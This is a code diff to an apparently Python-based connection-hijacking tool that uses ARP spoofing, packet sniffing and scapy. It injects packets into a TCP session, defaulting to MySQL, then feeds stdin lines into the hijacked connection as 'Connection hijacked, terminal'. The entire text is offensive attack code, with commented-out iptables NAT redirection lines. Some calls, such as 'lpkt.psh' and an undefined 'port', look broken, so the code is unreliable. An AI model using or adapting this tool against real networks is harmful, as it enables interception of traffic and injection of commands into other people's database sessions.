@@ -5,6 +5,7 @@ import time
 import sys
 import os
 import re
+from scapy.all import *
 from libs import injector, spoofing
 from libs import sniffer
 from libs import logger
@@ -12,6 +13,7 @@ from libs import packet
 
 class settings:
     logger  = None
+    cmd_list= []
     ip      = ""
     mac     = ""
     src     = ""
@@ -58,8 +60,7 @@ def main():
     args = parser.parse_args()
 
     if args.verbose != 0:
-        logger.init(args.verbose)
-        settings.logger = logger.logger()
+        settings.logger = logger.init(args.verbose)
 
     ip_reg = re.compile('^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$')
     mac_reg = re.compile('^(([0-9a-f]{2})(:(?!$)|$)){6}$', re.IGNORECASE)
@@ -84,7 +85,7 @@ def main():
     
     settings.src = args.src
     settings.dst = args.dst
-    settings.port = args.port
+    settings.port = port
     settings.iface = args.iface
 
     #enabling firewall redirection.
@@ -96,7 +97,7 @@ def main():
                 print("Invalid mac address!")
                 exit()
             print("arp spoofing mac, sleeping 5seconds")
-
+    mac = get_if_hwaddr(settings.iface)
     # TODO: Delete this rule after program is running
     #print("trying:")
     #print("iptables -t nat -A POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
@@ -110,14 +111,14 @@ def main():
         #os.system("iptables -D POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
         #settings.cmd_list.append("iptables -t nat -A POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
         #spoofer.start(settings.ip, settings.src, settings.dst)
-    injector.init("mysql" if len(proto) == 0 else proto, settings.src, settings.dst)
-    sniffer.start(settings.src, settings.dst, settings.port, settings.iface, args.write)
-    if sniffer.settings.injected is False:
-        print("Failed to get a packet sample.")
+    injector.init("mysql" if len(proto) == 0 else proto, settings.src, settings.dst, mac)
+    sniffer.start(settings.src, settings.dst, port, settings.iface, mac, args.write)
+    #if sniffer.settings.injected is False:
+    #    print("Failed to get a packet sample.")
     print("Connection hijacked, terminal:")
     while args.stdin:
         payload = sys.stdin.readline()
-        ready = packet.create_psh(payload)
+        ready = lpkt.psh(payload)
         packet.send(ready)
 
 def on_exit(*_):
